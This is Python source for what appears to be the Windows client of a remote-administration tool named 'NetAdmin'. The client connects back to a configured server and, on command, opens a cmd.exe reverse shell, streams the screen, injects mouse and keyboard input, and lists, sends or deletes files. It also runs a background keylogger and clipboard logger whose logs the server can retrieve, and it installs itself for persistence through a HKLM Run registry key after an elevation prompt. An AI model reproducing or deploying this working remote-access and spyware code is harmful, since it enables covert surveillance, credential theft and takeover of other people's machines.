import argparse
import base64
import configparser
import shutil
import time
import traceback
import cv2
import keyboard
import mss
import numpy
import platform
import pyperclip
import pyautogui
import pythoncom
import win32com.client as com
import wmi
import psutil
import GPUtil
import winreg
import win32api
from os import listdir
from os.path import isfile, join

import logging_setup
import reg_helpers
import runconfig
import statics
from OpenConnectionHelpers import *
from turbojpeg import TurboJPEG
from os import path
import mss.windows
from subprocess import Popen, PIPE
from SmartSocket import SmartSocket

try:
    logger = logging_setup.setup_logger()
    logging_setup.log_PyInstaller_state(logger)

    mss.windows.CAPTUREBLT = 0

    logger.info(f"TurboJPEG path: {statics.TURBOJPEG_PATH}")
    jpeg = TurboJPEG(statics.TURBOJPEG_PATH)

    # create a decorator to try the function and catch any exceptions
    def try_connection(func):
        def wrapper(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except (ConnectionAbortedError, ConnectionResetError, OSError) as e:
                print(f"THREAD {threading.current_thread().name} [FUNC {func.__name__}]: Connection disconnected by server without message:")
                print(e)
        return wrapper

    @try_connection
    def receive(sock, proc):
        while True:
            data = sock.recv(1024)
            print(f"Got data: {data.decode()}")
            proc.stdin.write(data)
            proc.stdin.flush()
            proc.stdin.write("\n".encode())
            proc.stdin.flush()

    #@profile
    def screenShareClient(conn : SmartSocket, response_id):
        with mss.mss() as sct:
            monitor = sct.monitors[0]
            # send response to client
            # user32 = ctypes.windll.user32
            # local_resolution = str((user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)))
            local_resolution = (monitor['width'], monitor['height'])
            conn.send_message(
                NetMessage(type=NetTypes.NetStatus, data=NetStatusTypes.NetOK, extra=str(local_resolution), id=response_id))

            # The region to capture
            i = 0
            start = time.time()
            while True:
                if i == 30:
                    print(f'ScreenShare FPS: {(30 / (time.time() - start))}')
                    i = 0
                    start = time.time()
                i += 1
                image = numpy.array(sct.grab(monitor))
                image = cv2.cvtColor(image, cv2.COLOR_RGB2BGR)
                image = jpeg.encode(image, quality=75)
                # buffer = io.BytesIO()
                # im = Image.frombytes('RGB', image.size, image.rgb)
                # im.save(buffer, format="JPEG", quality=75)
                # Send the size of the pixels length

                # # Send pixels
                # buffer.seek(0)
                # g = buffer.read()
                # conn.send(len(image).to_bytes(4, "big"))
                # conn.send(image)
                try:
                    conn.send_appended_stream(image)
                except:
                    print("ScreenShare connection closed")
                    return


    # def screenShareClient(conn):
    #     rect = {'top': 0, 'left': 0, 'width': 1920, 'height': 1080}
    #     with mss.mss() as sct:
    #         # The region to capture
    #         i = 0
    #         start = time.time()
    #         while True:
    #             if i == 30:
    #                 print('30 frames in {} seconds'.format(time.time() - start))
    #                 i = 0
    #                 start = time.time()
    #             i += 1
    #             image = sct.grab(rect)
    #             buffer = io.BytesIO()
    #             im = Image.frombytes('RGB', image.size, image.rgb)
    #             im.save(buffer, format="JPEG", quality=75)
    #             # Send the size of the pixels length
    #
    #             # Send pixels
    #             buffer.seek(0)
    #             g = buffer.read()
    #             conn.send(len(g).to_bytes(4, "big"))
    #             conn.send(g)


    @try_connection
    def handleOpenConnection(client : SmartSocket):
        print("OpenConnection from: " + str(client.getsockname()))

        # listener loop
        while True:
            # read message
            size, message, isEncrypted = client.receive_message()
            if isEncrypted:
                print("Decrypted message")

            if size == -1:
                # if server disconnected, close local open connection server
                client.close()
                break

            id = message['id'] # get the echo id of the message, to echo back to the server when sending response

            # if message is a request
            if message['type'] == NetTypes.NetRequest.value:
                # if the request is to close the connection
                if message['data'] == NetTypes.NetCloseConnection.value:
                    print(f"Closing unmanaged connection {str(client.getsockname())}")
                    client.close()
                    break

                elif message['data'] == NetTypes.NetRemoteControl.value:
                    print(f"Remote control request from {str(client.getsockname())}")
                    # open screenshare
                    p = threading.Thread(target=screenShareClient, args=(client, id))
                    p.start()
                    break

                # if the request is to open a shell connection
                elif message['data'] == NetTypes.NetOpenShell.value:
                    # open shell process
                    import subprocess
                    p = subprocess.Popen("cmd.exe", stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, shell=True)
                    thread = threading.Thread(target=receive, args=(client, p,))
                    thread.start()
                    client.send_message(NetMessage(type=NetTypes.NetStatus, data=NetStatus(NetStatusTypes.NetOK.value), id=id))
                    while p.poll() is None:
                        n = p.stdout.readline()
                        client.send_appended_stream(n)

                # if the request is to download file
                elif message['data'] == NetTypes.NetDownloadFile.value:
                    # get the file directory
                    directory = message['extra']

                    # send all files
                    sendallfiles(client, directory)

                    # send file download end status
                    client.send_message(NetMessage(NetTypes.NetStatus.value, NetStatus(NetStatusTypes.NetDownloadFinished.value)))

    def ActualDirectorySize(path, f):
        size = 0
        try:
            for dir in os.scandir(path):
                try:
                    if dir.is_file():
                        size += dir.stat().st_size
                    else:
                        size += ActualDirectorySize(dir.path, False)
                except:
                    print("Error getting size of " + dir.path)
        except:
            print("Error getting size of " + path)
            if f:
                return 0 # signifying that the size of all accessible files (which is no files) is 0
        return size

    key_queue_lock = threading.Lock()
    key_queue = list()

    class KeyPressContainer:
        def __init__(self, key):
            if key == "space":
                self.key = " "
            elif len(key) > 1:
                self.key = str.upper(key)
            else:
                self.key = key
            self.total = 1

        def inc(self):
            self.total += 1

        def __eq__(self, other):
            return self.key == other.key

        def __str__(self):
            if len(self.key) > 1:
                if self.total > 1:
                    return f" [{self.key} x{self.total}] "
                else:
                    return f" [{self.key}] "
            else:
                return self.key*self.total

    def keyhook(event):
        # make a keypress container out of the event
        keyContainer = KeyPressContainer(event.name)
        if event.event_type == 'down':
            # if the key is already in the top of the queue, increment the total
            with key_queue_lock:
                # if queue has keys in it
                if len(key_queue) > 0:
                    if key_queue[-1] == keyContainer:
                        key_queue[-1].inc()
                    else:
                        key_queue.append(keyContainer)

                else:
                    # try:
                    #     iEvent = ord(event.name)
                    # except:
                    #     iEvent = None
                    # if iEvent:
                    #     if 126 >= iEvent >= 33:
                    #         strPrev = str(event.name)
                    #         key_queue.put(strPrev)
                    # else:
                    key_queue.append(keyContainer)

    import pathlib

    def keylogger(status):
        keyboard.hook(keyhook)
        while status:
            with key_queue_lock:
                if len(key_queue):
                    with open(statics.KEYLOGGER_FILE_PATH, "a+") as f:
                        logger.debug("OPENED KEYLOGGER FUNC")
                        f.write(f"[{datetime.datetime.now()}] ")
                        while len(key_queue) > 0:
                            f.write(str(key_queue.pop(0)))
                        f.write("\n")
            time.sleep(2)

    def clipboard_logger(status):
        prevClip = None
        while status:
            cClip = pyperclip.paste()
            if prevClip != cClip:
                prevClip = cClip
                with open(statics.CLIPBOARD_FILE_PATH, "a+") as f:
                    logger.debug("OPENED CLIPBOARD FUNC")
                    f.write(f"[{datetime.datetime.now()}] \n{cClip}\n")
            time.sleep(2)

    process_status = SharedBoolean(True)

    def main(config=None):
        # NOT NEEDED SINCE SERVICE
        # # make sure only one instance of the application is running
        # try:
        #     sng = singleton.SingleInstance()
        # except:
        #     print("Another instance of the application is already running")
        #     return

        # read IP and port from config file
        config_parser = configparser.ConfigParser()
        f = config
        if f:
            config_parser.read_file(f)
            cAddress = config_parser['CONNECTION']['ip_or_hostname']
            cPort = config_parser['CONNECTION']['port']
            cType = config_parser['CONNECTION']['type']
        else:
            logger.info("NO CONFIG FILE FOUND")
            cAddress = "127.0.0.1"
            cPort = 49152
            cType = "ip"

        pythoncom.CoInitialize()
        logger.info("SERVICE STARTED")
        pathlib.Path(statics.PROGRAMDATA_NETADMIN_PATH).mkdir(parents=True, exist_ok=True)

        thread = threading.Thread(target=keylogger, args=(process_status,))
        thread.start()

        # create clipboard logger
        thread2 = threading.Thread(target=clipboard_logger, args=(process_status,))
        thread2.start()
        print("Started keylogger and clipboard logger")

        computer = wmi.WMI()

        while True:
            try:
                if cType.lower() == "hostname":
                    sockaddr = socket.getaddrinfo(cAddress, cPort)[0][4]
                else:
                    sockaddr = (cAddress, int(cPort))

                s = SmartSocket(None, socket.AF_INET, socket.SOCK_STREAM)
                s.connect(sockaddr)

                logger.info("CONNECTED TO SERVER")
                client_connection_main(s, computer)
            # if we except because of s.connect, retry connection
            #TODO if we get an error due to other exceptions, do not try to reconnect
            except (ConnectionAbortedError, ConnectionResetError, OSError) as e:
                print(str(e))
                print("Waiting 5 seconds before trying to reconnect")
                time.sleep(5)
            # if client_connection_main ends and the try_connection decorator catches the exception, then check the process status and if true, retry connection
            else:
                logger.info("DISCONNECTED FROM SERVER")
                if not process_status:
                    logger.info("PROCESS STATUS IS FALSE, STOPPING THE PROCESS")
                    break

    @try_connection
    def client_connection_main(s, computer):
        # main loop
        # receives and unpacks messages from the server, and checks the type of message
        while process_status:
            size, message, isEncrypted = s.receive_message()
            if message == -1:
                return

            id = message['id']  # get the echo id of the message, to echo back to the server when sending response

            # if message is an error
            if message['type'] == NetTypes.NetStatus.value:

                # identification error
                if message['data'] == NetStatusTypes.NetInvalidIdentification.value:
                    print("Invalid identification sent. Resetting...")
                    # reset the id
                    reg_helpers.set_id("")
                    # send a request to identify again
                    s.send_message(NetMessage(type=NetTypes.NetIdentification, data=NetIdentification(reg_helpers.get_id()), id=id))

            # if message is a request
            if message['type'] == NetTypes.NetRequest.value:
                if message['data'] == NetTypes.NetHeartbeat.value:
                    s.send_message(NetMessage(type=NetTypes.NetHeartbeat, data=NetStatus(NetStatusTypes.NetOK.value), id=id))
                elif message['data'] == NetTypes.NetUninstallClient.value:
                    quit(0)
                elif message['data'] == NetTypes.NetKeyboardAction.value:
                    print(f"Keyboard action request from {message['extra']}")
                    pyautogui.press(message['extra'], _pause=False)

                elif message['data'] == NetTypes.NetGetKeylogger.value:
                    print(f"Keylogger request from {message['extra']}")
                    try:
                        with open(statics.KEYLOGGER_FILE_PATH, "r") as f:
                            logger.debug("OPENED KEYLOGGER")
                            # TODO - split the file into 16KB chunks and send it in 16KB chunks
                            s.send_message(NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id))
                    except Exception as e:
                        logger.info(str(e))

                elif message['data'] == NetTypes.NetGetClipboard.value:
                    print(f"Keylogger request from {message['extra']}")
                    try:
                        with open(statics.CLIPBOARD_FILE_PATH, "r") as f:
                            logger.debug("OPENED CLIPBOARD")
                            s.send_message(NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id))
                    except Exception as e:
                        logger.info(str(e))

                elif message['data'] == NetTypes.NetMouseMoveAction.value:
                    print(f"Mouse action request from {message['extra']}")
                    start = time.time()
                    pyautogui.moveTo(message['extra'][0], message['extra'][1], _pause=False)
                    print(time.time() - start)

                elif message['data'] == NetTypes.NetMouseClickDownAction.value:
                    print(f"Mouse click down action request from {message['extra']}")
                    if message['extra'][0] == 1:
                        pyautogui.mouseDown(button="left", x=message['extra'][1], y=message['extra'][2], _pause=False)
                    elif message['extra'][0] == 3:
                        pyautogui.mouseDown(button="right", x=message['extra'][1], y=message['extra'][2], _pause=False)
                    elif message['extra'][0] >= 4:
                        if message['extra'][0] % 2 == 1:
                            pyautogui.scroll(-50, _pause=False)
                        else:
                            pyautogui.scroll(50, _pause=False)
                    elif message['extra'][0] == 2:
                        pyautogui.middleClick(_pause=False)


                elif message['data'] == NetTypes.NetMouseClickUpAction.value:
                    print(f"Mouse click up action request from {message['extra']}")
                    if message['extra'][0] == 1:
                        pyautogui.mouseUp(button="left", x=message['extra'][1], y=message['extra'][2], _pause=False)
                    elif message['extra'][0] == 3:
                        pyautogui.mouseUp(button="right", x=message['extra'][1], y=message['extra'][2], _pause=False)
                    elif message['extra'][0] == 5:
                        pyautogui.scroll(-50, _pause=False)
                    elif message['extra'][0] == 4:
                        pyautogui.scroll(50, _pause=False)
                    elif message['extra'][0] == 2:
                        pyautogui.middleClick(_pause=False)
                # if the request is to find the size of a directory
                elif message['data'] == NetTypes.NetDirectorySize.value:
                    # get the directory
                    directory = message['extra']

                    # send the size of the directory
                    start = datetime.datetime.now()
                    actualCall = ActualDirectorySize(directory, True)
                    print(f"Manual method for {directory}: {datetime.datetime.now() - start}")
                    s.send_message(NetMessage(type=NetTypes.NetDirectorySize, data=NetDirectorySize(actualCall), id=id))

                # if the request is to delete a file
                elif message['data'] == NetTypes.NetDeleteFile.value:
                    path = message['extra']

                    # try to delete the path
                    try:
                        if os.path.isfile(path):  # if the path is a file
                            os.remove(path)
                        else:  # if the path is a directory
                            os.rmdir(path)

                    # file or directory doesn't exist
                    except FileNotFoundError:
                        print("File not found: " + path)
                        s.send_message(NetMessage(type=NetTypes.NetStatus, data=NetStatus(NetStatusTypes.NetFileNotFound.value),
                                       id=id))

                    # no access to directory error
                    except WindowsError:
                        print("Error deleting file: " + path)
                        s.send_message(NetMessage(type=NetTypes.NetStatus, data=NetStatus(
                            NetStatusTypes.NetDirectoryAccessDenied.value), id=id))

                    # success
                    else:
                        s.send_message(NetMessage(type=NetTypes.NetStatus, data=NetStatus(NetStatusTypes.NetOK.value), id=id))

                elif message['data'] == NetTypes.NetIdentification.value:  # if request to identify
                    try:
                        uid = reg_helpers.get_id()
                    except:  # will raise an exception if the key does not exist
                        sMessage = NetIdentification(
                            "")  # if there is no id, then send a blank id to tell the server that this is a new client
                    else:
                        sMessage = NetIdentification(uid)  # if there is an id, then send the id to the server
                    s.send_message(NetMessage(type=NetTypes.NetIdentification, data=sMessage, id=id))

                elif message['data'] == NetTypes.NetEncryptionVerification.value:  # if request to verify encryption
                    d = reg_helpers.get_encryption_key().encode()
                    s.set_key(d)  # set the encryption key
                    s.send_message(NetMessage(type=NetTypes.NetEncryptionVerification, data=NetStatus(NetStatusTypes.NetOK.value), id=id))

                # if request system information
                elif message['data'] == NetTypes.NetSystemInformation.value:
                    sMessage = NetSystemInformation(
                        platform.node(),
                        platform.system(),
                        platform.processor(),
                        platform.machine(),
                        computer.Win32_VideoController()[0].Name
                    )
                    s.send_message(NetMessage(NetTypes.NetSystemInformation, sMessage, id=id))

                # if request system metrics
                elif message['data'] == NetTypes.NetSystemMetrics.value:
                    try:
                        GPU_LOAD = GPUtil.getGPUs()[0].load
                    except:
                        GPU_LOAD = 0
                    sMessage = NetSystemMetrics(
                        psutil.cpu_percent(),
                        RAM_LOAD=psutil.virtual_memory().percent,
                        GPU_LOAD=GPU_LOAD,
                        DISK_LOAD=psutil.disk_usage('/')[3]
                    )
                    s.send_message(NetMessage(NetTypes.NetSystemMetrics, sMessage, id=id))

                # if request to open a new connection
                elif message['data'] == NetTypes.NetOpenConnection.value:
                    # create a server with the port specified in extra, and pass it to handleOpenConnection
                    if message['extra'] == True:
                        Fkey = s.Fkey
                    else:
                        Fkey = None
                    sock = SmartSocket(None, socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((s.getsockname()[0], 49153))
                    sock.send_message(NetMessage(NetTypes.NetStatus, NetStatus(NetStatusTypes.NetOK.value), id=id))
                    sock.send_appended_stream(s.fernetInstance.encrypt(orjson.dumps(NetMessage(NetTypes.NetStatus, NetStatus(NetStatusTypes.NetOK.value), id=id))))
                    if Fkey:
                        sock.set_key(Fkey)
                    thread = threading.Thread(target=handleOpenConnection, args=(sock,))
                    thread.start()

                # # if request actual folder size
                # elif message['data'] == NetTypes.NetDirectorySize.value:
                #     path = message['extra']
                #     size = ActualDirectorySize(path, True)
                #     s.send(NetProtocol.packNetMessage(NetMessage(NetTypes.NetDirectorySize, NetDirectorySize(size), id=id)))

                # if request a directory listing
                elif message['data'] == NetTypes.NetDirectoryListing.value:
                    # directory string is stored in the extra field of the message
                    directory = message['extra']

                    # if requesting root directory
                    if (directory == ""):
                        drives = win32api.GetLogicalDriveStrings()
                        drives = drives.split('\000')[:-1]
                        sMessage = NetDirectoryListing("", [])
                        for drive in drives:
                            sMessage.items.append(
                                NetDirectoryItem(drive[:2], drive, NetTypes.NetDirectoryFolderCollapsable.value, None,
                                                 None, None))
                        s.send_message(NetMessage(NetTypes.NetDirectoryListing, sMessage, id=id))

                    # if requesting normal directory
                    else:
                        # check if there is access to the directory
                        try:
                            files = [f for f in listdir(directory) if isfile(join(directory, f))]
                            folders = [f for f in listdir(directory) if not isfile(join(directory, f))]

                        # if there is no access, then there is a PermissionError
                        except PermissionError as e:
                            print("Permission is denied for directory", directory)
                            # send a NetDirectoryAccessDenied error to the server
                            s.send_message(
                                NetMessage(NetTypes.NetStatus, NetStatus(NetStatusTypes.NetDirectoryAccessDenied.value),
                                           id=id))

                        # if got directory listing (we have permission)
                        else:
                            sMessage = NetDirectoryListing(directory, [])
                            ctime = datetime.datetime.now()
                            # append NetDirectoryItems for each file/folder
                            for folder in folders:
                                winfolderPath = directory + folder + "\\"
                                try:

                                    # try to get folder size via windows scripting

                                    dispatch = com.Dispatch("Scripting.FileSystemObject")
                                    winfolder = dispatch.GetFolder(winfolderPath)
                                    size = winfolder.Size
                                    readable = True

                                    # # --manual method
                                    # size = ActualDirectorySize(winfolderPath, True)
                                    # readable = True

                                except:
                                    # if not successful, then use then size = -1 to signify that the folder size is not available
                                    size = -1
                                    # if couldn't get size, check if the folder is inaccessible, or just subdirectories are inaccessible
                                    try:
                                        listdir(winfolderPath)
                                    except:
                                        readable = False
                                    else:
                                        readable = True
                                sMessage.items.append(NetDirectoryItem(folder, directory + folder + "\\",
                                                                       NetTypes.NetDirectoryFolderCollapsable, readable,
                                                                       date_created=os.path.getctime(
                                                                           directory + folder + "\\"), size=size))
                            for file in files:
                                if os.access(directory + file, os.R_OK):
                                    readable = True
                                else:
                                    readable = False
                                sMessage.items.append(
                                    NetDirectoryItem(file, directory + file, NetTypes.NetDirectoryFile.value, readable,
                                                     date_created=os.path.getctime(directory + file),
                                                     last_modified=os.path.getmtime(directory + file),
                                                     size=os.path.getsize(directory + file)))
                            print(f"WinScript Method for {directory}: ", datetime.datetime.now() - ctime)
                            s.send_message(NetMessage(NetTypes.NetDirectoryListing, sMessage, id=id))

            # if server sent an id, then set the id to it
            elif message['type'] == NetTypes.NetIdentification.value:
                reg_helpers.set_id(message['data']['id'])
                reg_helpers.set_encryption_key(message['extra'])


    import ctypes, sys

    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False


    def install(run=True):
        try:
            '''
            1. Copies the exeutable to ProgramData
            2. Adds to startup.
            Args:
                run: whether to run the client after installation
    
            '''
            print("Installing NetAdmin.... Please wait....")

            if not is_admin():
                logger.info("NOT ADMIN")
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
                sys.exit(0)
            else:
                logger.info("IS ADMIN!!!")

            # check if exe exists
            pathlib.Path(statics.PROGRAMDATA_NETADMIN_PATH).mkdir(parents=True, exist_ok=True)
            # if not os.path.isfile(BASE_PATH+"NetAdmin.exe"):
            #     # copy our file to the path
            #     logger.info("NetAdmin.exe not found in ProgramData. Copying NetAdmin.exe to ProgramData...")
            logger.info("Copying NetAdmin.exe to ProgramData...")
            shutil.copy(sys.executable, statics.PROGRAMDATA_NETADMIN_PATH + "NetAdmin.exe")

            # verify that config file exists
            config = runconfig.get_runconfig(statics.PROGRAMDATA_NETADMIN_PATH)
            if not config:
                input_installation(statics.PROGRAMDATA_NETADMIN_PATH)

            # proc_arch = os.environ.get('PROCESSOR_ARCHITECTURE')
            # proc_arch64 = os.environ.get('PROCESSOR_ARCHITEW6432')

            # if proc_arch.lower() == 'x86' and not proc_arch64:
            #     arch_keys = {0}
            # elif proc_arch.lower() == 'x86' or proc_arch.lower() == 'amd64':
            #     arch_keys = winreg.KEY_WOW64_32KEY

            # check if registry value has been set
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0,
                                 winreg.KEY_SET_VALUE)
            try:
                winreg.QueryValue(key, "NetAdmin")
            except Exception as e:
                print(e)
                # create registry value
                winreg.SetValueEx(key, "NetAdmin", 0, winreg.REG_SZ, statics.PROGRAMDATA_NETADMIN_PATH + "NetAdmin.exe --run_main")
                logger.info("NetAdmin.exe added to startup")
            else:
                logger.info("NetAdmin.exe already added to startup")
            winreg.CloseKey(key)
            ctypes.windll.user32.MessageBoxW(0, "The installation process has finished.", "Installation Complete", 0)
            CREATE_NEW_PROCESS_GROUP = 0x00000200
            DETACHED_PROCESS = 0x00000008

            Popen([statics.PROGRAMDATA_NETADMIN_PATH + "NetAdmin.exe", "-r"], stdin=PIPE, stdout=PIPE, stderr=PIPE, creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP)

            sys.exit(0)
        except Exception as e:
            logger.info(e)

    def get_exe_directory():
        return os.path.dirname(sys.executable)+"\\"

    def input_installation(path):
        print("Welcome to the NetAdmin manual installation. This window is shown because the manual installation option was chosen in the client executable creation process.")
        ip = input("IP: ")
        port = input("Port: ")
        config = configparser.ConfigParser()
        config['CONNECTION'] = {'ip_or_hostname': ip, 'port': port, 'type': 'ip'}
        with open(path + "runconfig.ini", 'w+') as configfile:
            config.write(configfile)

    if __name__ == "__main__":
        logger.info(statics.PROGRAMDATA_NETADMIN_PATH + "NetAdmin.exe")
        if not (getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS')):
            main()
        else:
            # handle arguments
            parser = argparse.ArgumentParser()
            parser.add_argument("-r", "--run_main", help="Run the main() client function.", action='store_true')
            parser.add_argument("-i", "--install", help="Install the NetAdmin executable.", action='store_true')
            logger.info("args=%s" % str(sys.argv))
            args = parser.parse_args()
            if args.run_main:
                config = runconfig.get_runconfig(get_exe_directory())
                if not config:
                    logger.info("ERROR: NO CONFIG FILE WAS FOUND. INSTALLATION CORRUPTED. ")
                else:
                    main(config)
            else:
                install()

except Exception as e:
    if not (getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS')):
        raise Exception
    else:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        logger.info(str(fname) + " " + str(exc_tb.tb_lineno) + " " + traceback.format_exc())